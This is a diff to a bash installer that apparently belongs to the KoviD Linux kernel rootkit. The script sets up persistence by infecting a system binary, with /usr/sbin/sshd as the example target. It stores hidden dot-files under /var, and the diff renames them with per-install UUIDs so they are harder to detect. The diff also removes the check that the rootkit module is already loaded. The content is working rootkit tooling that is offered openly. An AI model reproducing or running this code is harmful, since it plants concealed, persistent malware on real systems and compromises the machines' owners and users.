@@ -4,12 +4,10 @@
 # -hash
 set -eou pipefail
 
-# UUIDGEN must be passed as environment variable.
-# Check Makefile, persist.S
+# Copy output from "make persist" example:
+# 	sudo UUIDGEN=78c8eec0-a4a1-471c-b644-ba788074d3c5 ./scripts/install.sh /usr/sbin/sshd
 #
-# Use:
-#   UUIDGEN=value ./install.sh
-UUIDGEN=$UUIDGEN
+UUIDGEN=${UUIDGEN}
 
 PREFIX="/${0%/*}"
 PREFIX=${PREFIX:-.}
@@ -17,7 +15,6 @@ PREFIX=${PREFIX#/}/
 PREFIX=$(cd "$PREFIX"; pwd)
 
 # Defaults
-# Warning: avoid changing these variables
 INSTALL="/var"
 VOLUNDR=${VOLUNDR:-$PREFIX/../volundr}
 KOVID=${KOVID:-$PREFIX/../kovid.ko}
@@ -66,8 +63,8 @@ check_util() {
 } >&2
 
 function do_install_files_error() {
-    rm -fv "$INSTALL"/.kv.ko
-    rm -fv "$INSTALL"/.lm.sh
+    rm -fv "$INSTALL"/.$UUIDGEN.ko
+    rm -fv "$INSTALL"/.$UUIDGEN.sh
 }
 
 function do_install_files() {
@@ -154,10 +151,6 @@ if [[ "1" -ne "$#" ]]; then
 fi
 
 check_util readelf md5sum mktemp stat
-
-if [[ ! -f /proc/kovid ]]; then
-    errexit "KoviD not running" true 1
-fi
 
 do_persist "$1"
 
